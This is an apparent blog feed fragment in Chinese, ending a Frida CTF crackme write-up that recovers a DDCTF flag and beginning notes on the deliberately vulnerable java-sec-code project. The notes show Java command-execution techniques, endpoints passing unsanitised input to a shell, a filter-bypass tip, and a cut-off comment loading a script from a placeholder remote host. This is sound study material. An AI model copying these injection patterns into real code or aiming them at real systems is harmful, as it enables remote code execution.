cn.chaitin.geektan.crackme.MainActivityPatch(java.lang.Object)</span><br><span class="line">orinin:cn.chaitin.geektan.crackme.MainActivity@4a3e446</span><br><span class="line">patchAc:cn.chaitin.geektan.crackme.MainActivityPatch@d79b607</span><br><span class="line">message: &#123;&#39;type&#39;: &#39;send&#39;, &#39;payload&#39;: &#39;&lt;instance: java.lang.Object, $className: cn.chaitin.geektan.crackme.MainActivityPatch&gt;&#39;&#125; data: None</span><br></pre></td></tr></table></figure><p>2.我们得到了实例化的类后，第二步就是利用getDeclaredMethods()，获取本类中的所有方法，包括私有的(private、protected、默认以及public)的方法，并通过数组下标的方式获取我们想要的方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Method[] getDeclaredMethods() throws SecurityException &#123;</span><br><span class="line">       Method[] result &#x3D; getDeclaredMethodsUnchecked(false);</span><br><span class="line">       for (Method m : result) &#123;</span><br><span class="line">           &#x2F;&#x2F; Throw NoClassDefFoundError if types cannot be resolved.</span><br><span class="line">           m.getReturnType();</span><br><span class="line">           m.getParameterTypes();</span><br><span class="line">       &#125;</span><br><span class="line">       return result;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>从getDeclareMethods()，我们知道它返回的是一个Method数组</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var func &#x3D; hookClassCast.getDeclaredMethods();</span><br><span class="line">console.log(func);</span><br><span class="line">&#x2F;&#x2F;直接通过下标获取我们要调用的方法</span><br><span class="line">console.log(func[0]);</span><br></pre></td></tr></table></figure><p>看看一个完整的示例，和上面的一样，仅仅调用了getDeclaredMethods()方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var orininclass &#x3D; Java.use(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;);</span><br><span class="line">        var Integerclass &#x3D; Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">        &#x2F;&#x2F;实例化MainActivity对象</span><br><span class="line">        var mainAc &#x3D; orininclass.$new();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line"> </span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                console.log(&quot;-----------------------------BEGIN-------------------------------------&quot;);</span><br><span class="line">                &#x2F;&#x2F;获取构造器</span><br><span class="line">                var ConstructorParam &#x3D;Java.array(&#39;Ljava.lang.Object;&#39;,[objectclass.class]);</span><br><span class="line">                var Constructor &#x3D; hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line">                console.log(&quot;Constructor:&quot;+Constructor);</span><br><span class="line">                console.log(&quot;orinin:&quot;+mainAc);</span><br><span class="line">                &#x2F;&#x2F;实例化，newInstance的参数也是Ljava.lang.Object;</span><br><span class="line">                var instance &#x3D; Constructor.newInstance([mainAc]);</span><br><span class="line">                console.log(&quot;MainActivityPatchInstance:&quot;+instance);</span><br><span class="line">                send(instance);</span><br><span class="line">                console.log(&quot;----------------------------Methods---------------------------------&quot;);</span><br><span class="line">                var func &#x3D; hookClassCast.getDeclaredMethods();</span><br><span class="line">                console.log(func);</span><br><span class="line">                console.log(&quot;--------------------------Need Method---------------------------------&quot;);</span><br><span class="line">                console.log(func[0]);</span><br><span class="line">                var f &#x3D; func[0];</span><br><span class="line">                console.log(&quot;---------------------------- OVER---------------------------------&quot;);</span><br><span class="line">                return result;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211221163603106.png" alt="image-20211221163603106"></p><p>3.接下来就是调用Method.invoke()去执行对应的方法了，invoke方法的第一个参数是执行这个方法的对象实例，第二个参数是带入的实际值数组，返回值是Object，也既是该方法执行后的返回值。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public native Object invoke(Object obj, Object... args)</span><br><span class="line">           throws IllegalAccessException, IllegalArgumentException, InvocationTargetException;</span><br></pre></td></tr></table></figure><p>那现在就有一个问题，第二个值是一个数据，我们需要带入实际值的数组，那这么来构造数组呢，很简单刚刚我们已经学习了Frida 中Java.array的用法。现在我们就来构造2个实际值的Integer数组。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var Integerclass &#x3D; Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">var num1 &#x3D; Integerclass.$new(5);</span><br><span class="line">var num2 &#x3D; Integerclass.$new(6);</span><br><span class="line">var numArr1 &#x3D; Java.array(&#39;Ljava.lang.Object;&#39;,[num1,num2]);</span><br><span class="line">var num3 &#x3D; Integerclass.$new(7);</span><br><span class="line">var num4 &#x3D; Integerclass.$new(8);</span><br><span class="line">var numArr2 &#x3D; Java.array(&#39;Ljava.lang.Object;&#39;,[num3,num4]);</span><br></pre></td></tr></table></figure><p>接下来我们就可以愉快的调用Joseph方法了。</p><h2 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var orininclass &#x3D; Java.use(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;);</span><br><span class="line">        var Integerclass &#x3D; Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">        var mainAc &#x3D; orininclass.$new();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                console.log(&quot;-----------------------------GET Constructor-------------------------------------&quot;);</span><br><span class="line">                var ConstructorParam &#x3D;Java.array(&#39;Ljava.lang.Object;&#39;,[objectclass.class]);</span><br><span class="line">                var Constructor &#x3D; hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line">                console.log(&quot;Constructor:&quot;+Constructor);</span><br><span class="line">                console.log(&quot;orinin:&quot;+mainAc);</span><br><span class="line">                var instance &#x3D; Constructor.newInstance([mainAc]);</span><br><span class="line">                console.log(&quot;patchAc:&quot;+instance);</span><br><span class="line">                send(instance);</span><br><span class="line"> </span><br><span class="line">                console.log(&quot;-----------------------------GET Methods----------------------------&quot;);</span><br><span class="line">                var func &#x3D; hookClassCast.getDeclaredMethods();</span><br><span class="line">                console.log(func);</span><br><span class="line">                console.log(&quot;--------------------------GET Joseph Function---------------------------&quot;);</span><br><span class="line">                console.log(func[0]);</span><br><span class="line">                var f &#x3D; func[0];</span><br><span class="line">                var num1 &#x3D; Integerclass.$new(5);</span><br><span class="line">                var num2 &#x3D; Integerclass.$new(6);</span><br><span class="line">                var numArr1 &#x3D; Java.array(&#39;Ljava.lang.Object;&#39;,[num1,num2]);</span><br><span class="line">                var num3 &#x3D; Integerclass.$new(7);</span><br><span class="line">                var num4 &#x3D; Integerclass.$new(8);</span><br><span class="line">                var numArr2 &#x3D; Java.array(&#39;Ljava.lang.Object;&#39;,[num3,num4]);</span><br><span class="line">                console.log(&quot;-----------------------------GET Array------------------------------&quot;);</span><br><span class="line">                console.log(numArr1);</span><br><span class="line">                console.log(numArr2);</span><br><span class="line">                var rtn1 &#x3D; f.invoke(instance,numArr1);</span><br><span class="line">                var rtn2 &#x3D; f.invoke(instance,numArr2);</span><br><span class="line">                console.log(&quot;--------------------------------FLAG---------------------------------&quot;);</span><br><span class="line">                console.log(&quot;DDCTF&#123;&quot;+rtn1+rtn2+&quot;&#125;&quot;);</span><br><span class="line">                console.log(&quot;--------------------------------OVER--------------------------------&quot;);</span><br><span class="line">                return result;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>得到最终答案：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211221182844509.png" alt="image-20211221182844509"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://bbs.pediy.com/thread-229657.htm">https://bbs.pediy.com/thread-229657.htm</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;​    上篇主要是跟着师傅学习了Robust的原理，并以做题的思路去求解了这个示例ctf，其实这是一种思路的启示，当我们在不知道怎么hook动态加载的dex，jar时候，找找是否存在能够操作动态加载出来的类的方法。&lt;/p&gt;
&lt;p&gt;​    这一篇我们一起来学习如何用Frida来hook DexclassLoader，如何用反射直接调用类的方法，达到跟hook一般类一样的效果。最终在虚拟机、测试机和frida中发现多种问题，之后更换测试机进行测试的时候仍然存在问题，留下了一部分搞不懂的地方，当个坑未，来找到解决问题在进行填补。&lt;/p&gt;
&lt;h1 id=&quot;文章涉及内容以及使用到的工具&quot;&gt;&lt;a href=&quot;#文章涉及内容以及使用到的工具&quot; class=&quot;headerlink&quot; title=&quot;文章涉及内容以及使用到的工具&quot;&gt;&lt;/a&gt;&lt;strong&gt;文章涉及内容以及使用到的工具&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;使用到的工具&quot;&gt;&lt;a href=&quot;#使用到的工具&quot; class=&quot;headerlink&quot; title=&quot;使用到的工具&quot;&gt;&lt;/a&gt;使用到的工具&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ADT（Android Developer Tools）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Jadx-gui&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;JEB&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;frida&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;apktool&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;android源码包&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nexus 6p（genymotion，实体机等亦可）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;涉及知识点&quot;&gt;&lt;a href=&quot;#涉及知识点&quot; class=&quot;headerlink&quot; title=&quot;涉及知识点&quot;&gt;&lt;/a&gt;涉及知识点&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Java 泛型&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Java 反射机制&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DexClassLoader 动态加载机制&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Frida 基本操作&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Frida 创建任意类型数组（Java.array）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Frida 类型转换（Java.cast）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Frida 方法重载（overload）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Frida Spawn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="Frida" scheme="http://www.ol4three.com/tags/Frida/"/>
    
      <category term="Hook" scheme="http://www.ol4three.com/tags/Hook/"/>
    
  </entry>
  
  <entry>
    <title>Java-sec-code学习记录</title>
    <link href="http://www.ol4three.com/2021/08/12/WEB/Code_audit/Java-sec-code%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://www.ol4three.com/2021/08/12/WEB/Code_audit/Java-sec-code%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2021-08-12T10:25:42.000Z</published>
    <updated>2022-07-14T10:58:52.607Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​    最近在搞Java类的代码审计，看到这个项目记录一下自己的学习过程</p><h1 id="0x01环境配置"><a href="#0x01环境配置" class="headerlink" title="0x01环境配置"></a>0x01环境配置</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mac os 11.2.2</span><br><span class="line">tomcat 8.5</span><br><span class="line">idea</span><br><span class="line">msyql 8.0.70</span><br></pre></td></tr></table></figure><p>导入idea项目配置本地tomcat</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;JoyChou93&#x2F;java-sec-code</span><br><span class="line">cd java-sec-code</span><br><span class="line">mvn clean package</span><br></pre></td></tr></table></figure><a id="more"></a><p>打开浏览器访问127.0.0.1:8080</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827091208429.png" alt="image-20210827091208429"></p><p>输入密码admin/admin123进行登陆</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="1-Rce"><a href="#1-Rce" class="headerlink" title="1. Rce"></a>1. Rce</h2><h3 id="Java命令执行的几种方式"><a href="#Java命令执行的几种方式" class="headerlink" title="Java命令执行的几种方式"></a>Java命令执行的几种方式</h3><h3 id="1）Runtime-类执行系统命令"><a href="#1）Runtime-类执行系统命令" class="headerlink" title="1）Runtime 类执行系统命令"></a>1）Runtime 类执行系统命令</h3><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Process p &#x3D; Runtime.getRuntime().exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure><p>详细代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Runtime1 &#123;</span><br><span class="line"></span><br><span class="line">       public static void main(String[] args) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Process p &#x3D; Runtime.getRuntime().exec(&quot;whoami&quot;);</span><br><span class="line">                InputStream input &#x3D; p.getInputStream();</span><br><span class="line">                InputStreamReader ins &#x3D; new InputStreamReader(input, &quot;utf-8&quot;);</span><br><span class="line">                &#x2F;&#x2F;InputStreamReader 字节流到字符流，并指定编码格式</span><br><span class="line">                BufferedReader br &#x3D; new BufferedReader(ins);</span><br><span class="line">                &#x2F;&#x2F;BufferedReader 从字符流读取文件并缓存字符</span><br><span class="line">                String line;</span><br><span class="line">                line &#x3D; br.readLine();</span><br><span class="line">                System.out.println(line);</span><br><span class="line">                br.close();</span><br><span class="line">                ins.close();</span><br><span class="line">                input.close();          </span><br><span class="line">                </span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过Runtime类exec方法执行命令获取输入流getInputStream()，再InputStreamReader过渡到字符流，并指定gbk的编码格式。BufferedReader 再从字符输入流中读取文本并缓冲字符。再通过readLine()方法打印出结果。</p><p>访问<a href="http://localhost:8080/java_sec_code_war/rce/exec?cmd=whoami">http://localhost:8080/java_sec_code_war/rce/exec?cmd=whoami</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827105713739.png" alt="image-20210827105713739"></p><p>查看Rce代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Rce &#123;</span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;&#x2F;exec&quot;)</span><br><span class="line">    public String CommandExec(String cmd) &#123;</span><br><span class="line">        Runtime run &#x3D; Runtime.getRuntime();</span><br><span class="line">        StringBuilder sb &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Process p &#x3D; run.exec(cmd);</span><br><span class="line">            BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream());</span><br><span class="line">            BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                sb.append(tmpStr);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (p.waitFor() !&#x3D; 0) &#123;</span><br><span class="line">                if (p.exitValue() &#x3D;&#x3D; 1)</span><br><span class="line">                    return &quot;Command exec failed!!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            inBr.close();</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        return sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Idea调试情况如下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827111228112.png" alt="image-20210827111228112"></p><h3 id="2）ProcessBuilder-类命令执行"><a href="#2）ProcessBuilder-类命令执行" class="headerlink" title="2）ProcessBuilder 类命令执行"></a>2）ProcessBuilder 类命令执行</h3><p>ProcessBuilder类通过创建系统进程执行命令。</p><p>核心代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ProcessBuilder builder &#x3D; new ProcessBuilder(&quot;whoami&quot;);</span><br><span class="line">Process process &#x3D; builder.start();</span><br></pre></td></tr></table></figure><p>详细代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class ProcessBuilder1 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String[] cmds &#x3D; new String[]&#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;whoami&quot;&#125;;</span><br><span class="line">            ProcessBuilder builder &#x3D; new ProcessBuilder(cmds);</span><br><span class="line">            Process process &#x3D; builder.start();</span><br><span class="line">            InputStream in &#x3D; process.getInputStream();</span><br><span class="line">            &#x2F;&#x2F;获取输入流</span><br><span class="line">            InputStreamReader ins &#x3D; new InputStreamReader(in, &quot;utf-8&quot;);</span><br><span class="line">            &#x2F;&#x2F; 字节流转化为字符流，并指定编码格式</span><br><span class="line">            char[] chs &#x3D; new char[1024];</span><br><span class="line">            int len &#x3D; ins.read(chs);</span><br><span class="line">            System.out.println(new String(chs,0,len));</span><br><span class="line">            ins.close();</span><br><span class="line">            in.close();</span><br><span class="line">            </span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过ProcessBuilder类执行系统命令获取结果。注意将命令隔开，同样转化为字符流InputStreamReader，并指定编码格式。read方法读取该字符流。将结果转化为字符串进行输出。</p><p>打开<a href="http://localhost:8080/java_sec_code_war/rce/ProcessBuilder?cmd=whoami">http://localhost:8080/java_sec_code_war/rce/ProcessBuilder?cmd=whoami</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827143330503.png" alt="image-20210827143330503"></p><p>Java-sec-code如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;rce&#x2F;ProcessBuilder?cmd&#x3D;whoami</span><br><span class="line"> * @param cmd cmd</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;ProcessBuilder&quot;)</span><br><span class="line">public String processBuilder(String cmd) &#123;</span><br><span class="line"></span><br><span class="line">    StringBuilder sb &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        String[] arrCmd &#x3D; &#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmd&#125;;</span><br><span class="line">        ProcessBuilder processBuilder &#x3D; new ProcessBuilder(arrCmd);</span><br><span class="line">        Process p &#x3D; processBuilder.start();</span><br><span class="line">        BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream());</span><br><span class="line">        BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));</span><br><span class="line">        String tmpStr;</span><br><span class="line"></span><br><span class="line">        while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123;</span><br><span class="line">            sb.append(tmpStr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return e.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return sb.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Idea调试如下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827143456512.png" alt="image-20210827143456512"></p><h3 id="3-反射调用Processlmpl-类执行系统命令"><a href="#3-反射调用Processlmpl-类执行系统命令" class="headerlink" title="3) 反射调用Processlmpl 类执行系统命令"></a>3) 反射调用Processlmpl 类执行系统命令</h3><p>Runtime和ProcessBuilder执行命令实际上调用了也是ProcessImpl类。对于该类，没有构造方法，只有一个private类型的方法。可以通过反射调用。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">Method method &#x3D; clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, Redirect[].class, boolean.class);</span><br><span class="line">method.setAccessible(true);</span><br><span class="line">Process e &#x3D; (Process) method.invoke(null, new String[]&#123;&quot;calc&quot;&#125;, null, &quot;.&quot;, null, true); </span><br></pre></td></tr></table></figure><p>详细代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.lang.ProcessBuilder.Redirect;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">@SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">public class ProcessImpl1&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String[] cmds &#x3D; new String[]&#123;&quot;whoami&quot;&#125;;</span><br><span class="line">        Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">        Method method &#x3D; clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, Redirect[].class, boolean.class);</span><br><span class="line">        method.setAccessible(true);</span><br><span class="line">        Process e &#x3D; (Process) method.invoke(null, cmds, null, &quot;.&quot;, null, true);</span><br><span class="line">        byte[] bs &#x3D; new byte[2048];</span><br><span class="line">        int readSize &#x3D; 0;</span><br><span class="line">        ByteArrayOutputStream infoStream &#x3D; new ByteArrayOutputStream();</span><br><span class="line">        while ((readSize &#x3D; e.getInputStream().read(bs)) &gt; 0) &#123;</span><br><span class="line">            infoStream.write(bs, 0, readSize);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(infoStream.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从ProcessImpl类的class对象中获取到方法然后反射调用，获取字节输入流getInputStream的结果。ByteArrayOutputStream 创建字节数组缓冲区。read() 方法读取字节流大小，并写进缓冲区。最后将缓冲区结果转化为字符串，并指定utf-8编码格式输出。</p><h3 id="4-反射调用Runtime类执行系统命令"><a href="#4-反射调用Runtime类执行系统命令" class="headerlink" title="4) 反射调用Runtime类执行系统命令"></a>4) 反射调用Runtime类执行系统命令</h3><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Constructor constructor &#x3D; clazz.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(true);</span><br><span class="line">Object runtimeInstance &#x3D; constructor.newInstance();</span><br><span class="line">Method runtimeMethod &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">Process process &#x3D; (Process) runtimeMethod.invoke(runtimeInstance, &quot;calc&quot;);</span><br></pre></td></tr></table></figure><p><code>java.lang.Runtime</code>类的无参构造方法私有的，可以通过反射修改方法的访问权限setAccessible，强制可以访问，然后获取类构造器的方法。再通过类加载newInstance()创建对象，反射再调用方法。</p><p>详细代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.lang.ProcessBuilder.Redirect;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">@SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">public class ProcessImpl1&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String[] cmds &#x3D; new String[]&#123;&quot;whoami&quot;&#125;;</span><br><span class="line">        Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">        Method method &#x3D; clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, Redirect[].class, boolean.class);</span><br><span class="line">        method.setAccessible(true);</span><br><span class="line">        Process e &#x3D; (Process) method.invoke(null, cmds, null, &quot;.&quot;, null, true);</span><br><span class="line">        byte[] bs &#x3D; new byte[2048];</span><br><span class="line">        int readSize &#x3D; 0;</span><br><span class="line">        ByteArrayOutputStream infoStream &#x3D; new ByteArrayOutputStream();</span><br><span class="line">        while ((readSize &#x3D; e.getInputStream().read(bs)) &gt; 0) &#123;</span><br><span class="line">            infoStream.write(bs, 0, readSize);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(infoStream.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-JavaScript命令执行"><a href="#5-JavaScript命令执行" class="headerlink" title="5) JavaScript命令执行"></a>5) JavaScript命令执行</h3><p>javax.script.ScriptEngine类是java自带的用于解析并执行js代码,可以在javascript中执行java代码.</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String str &#x3D; &quot;Jscode&quot;;</span><br><span class="line">        ScriptEngineManager manager &#x3D; new ScriptEngineManager(null);</span><br><span class="line">        ScriptEngine engine &#x3D; manager.getEngineByName(&quot;js&quot;);</span><br><span class="line">        engine.eval(str);</span><br></pre></td></tr></table></figure><p>详细代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import javax.script.ScriptEngine;</span><br><span class="line">import javax.script.ScriptEngineManager;</span><br><span class="line">import javax.script.ScriptException;</span><br><span class="line">public class Jsexec &#123;</span><br><span class="line">    public static void main(String[] argv) throws ScriptException &#123;</span><br><span class="line">        String str &#x3D; &quot;function test()&#123; return java.lang.Runtime&#125;;r&#x3D;test();r.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;</span><br><span class="line">        ScriptEngineManager manager &#x3D; new ScriptEngineManager(null);</span><br><span class="line">        ScriptEngine engine &#x3D; manager.getEngineByName(&quot;js&quot;);</span><br><span class="line">        engine.eval(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上。可以成功弹出计算器,如果遇到关键字检测。还可以用注释和空格绕过。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827145640867.png" alt="image-20210827145640867"></p><p>查看Java-sec-code代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;rce&#x2F;jscmd?jsurl&#x3D;http:&#x2F;&#x2F;xx.yy&#x2F;zz.js</span><br><span class="line"> *</span><br><span class="line"> * curl 